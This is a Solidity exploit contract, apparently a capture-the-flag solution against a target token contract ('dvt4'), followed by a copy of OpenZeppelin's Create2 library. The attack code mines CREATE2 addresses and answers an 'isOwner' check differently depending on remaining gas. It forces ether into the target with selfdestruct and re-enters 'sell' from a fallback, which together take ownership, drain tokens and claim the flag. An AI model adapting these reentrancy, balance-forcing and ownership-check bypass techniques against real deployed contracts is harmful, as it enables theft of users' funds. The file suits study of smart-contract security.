//SPDX-License-Identifier: Unlicense

pragma solidity >=0.6.12;

import "@openzeppelin/contracts/utils/Create2.sol";

contract ANS4 {
    function buy(address dvt4) external payable {
        I(dvt4).buy{value: 1}();
        I(dvt4).transfer(msg.sender, 100);
    }

    function sell(address dvt4) external {
        I(dvt4).sell(200);
        I(dvt4).change{gas: 1000000}(address(0));
        I(dvt4).change_Owner();
        I(dvt4).payforflag("[email protected]");
    }

    function die(address dvt4) external {
        selfdestruct(payable(dvt4));
    }

    function main(
        bytes32[4] memory salts,
        bytes memory bytecode,
        address dvt4
    ) external payable {
        address a0 = Create2.deploy(0, salts[0], bytecode);
        address a1 = Create2.deploy(0, salts[1], bytecode);
        address a2 = Create2.deploy(0, salts[2], bytecode);
        address a3 = Create2.deploy(0, salts[3], bytecode);
        ANS4(payable(a0)).buy{value: 1}(dvt4);
        ANS4(payable(a1)).buy{value: 1}(dvt4);
        ANS4(payable(a2)).buy{value: 1}(dvt4);
        ANS4(payable(a3)).buy{value: 397}(dvt4);
        I(dvt4).transfer(a0, 400);
        ANS4(payable(a3)).die(dvt4);
        ANS4(payable(a0)).sell(dvt4);
    }

    function salts(bytes memory bytecode)
        external
        view
        returns (bytes32[4] memory ret)
    {
        uint256 i = 0;
        uint256 n = 0;
        bytes32 digest = keccak256(bytecode);
        while (n < 4) {
            address addr = Create2.computeAddress(bytes32(i), digest);
            if (uint160(addr) & 0xfff == 0xfff) {
                ret[n] = bytes32(i);
                n++;
            }
            i++;
        }
    }

    function isOwner(address) external view returns (bool) {
        if (gasleft() > 900000) {
            while (gasleft() > 800000) {}
            return false;
        }
        return true;
    }

    fallback() external payable {
        if (address(this).balance == 200) {
            I(msg.sender).sell(200);
        }
    }
}

interface I {
    function buy() external payable returns (bool);

    function sell(uint256) external returns (bool);

    function transfer(address, uint256) external returns (bool);

    function change(address) external;

    function change_Owner() external;

    function payforflag(string memory) external;
}

pragma solidity ^0.6.0;

/**
 * @dev Helper to make usage of the `CREATE2` EVM opcode easier and safer.
 * `CREATE2` can be used to compute in advance the address where a smart
 * contract will be deployed, which allows for interesting new mechanisms known
 * as 'counterfactual interactions'.
 *
 * See the https://eips.ethereum.org/EIPS/eip-1014#motivation[EIP] for more
 * information.
 */
library Create2 {
    /**
     * @dev Deploys a contract using `CREATE2`. The address where the contract
     * will be deployed can be known in advance via {computeAddress}.
     *
     * The bytecode for a contract can be obtained from Solidity with
     * `type(contractName).creationCode`.
     *
     * Requirements:
     *
     * - `bytecode` must not be empty.
     * - `salt` must have not been used for `bytecode` already.
     * - the factory must have a balance of at least `amount`.
     * - if `amount` is non-zero, `bytecode` must have a `payable` constructor.
     */
    function deploy(uint256 amount, bytes32 salt, bytes memory bytecode) internal returns (address) {
        address addr;
        require(address(this).balance >= amount, "Create2: insufficient balance");
        require(bytecode.length != 0, "Create2: bytecode length is zero");
        // solhint-disable-next-line no-inline-assembly
        assembly {
            addr := create2(amount, add(bytecode, 0x20), mload(bytecode), salt)
        }
        require(addr != address(0), "Create2: Failed on deploy");
        return addr;
    }

    /**
     * @dev Returns the address where a contract will be stored if deployed via {deploy}. Any change in the
     * `bytecodeHash` or `salt` will result in a new destination address.
     */
    function computeAddress(bytes32 salt, bytes32 bytecodeHash) internal view returns (address) {
        return computeAddress(salt, bytecodeHash, address(this));
    }

    /**
     * @dev Returns the address where a contract will be stored if deployed via {deploy} from a contract located at
     * `deployer`. If `deployer` is this contract's address, returns the same value as {computeAddress}.
     */
    function computeAddress(bytes32 salt, bytes32 bytecodeHash, address deployer) internal pure returns (address) {
        bytes32 _data = keccak256(
            abi.encodePacked(bytes1(0xff), deployer, salt, bytecodeHash)
        );
        return address(bytes20(_data << 96));
    }
}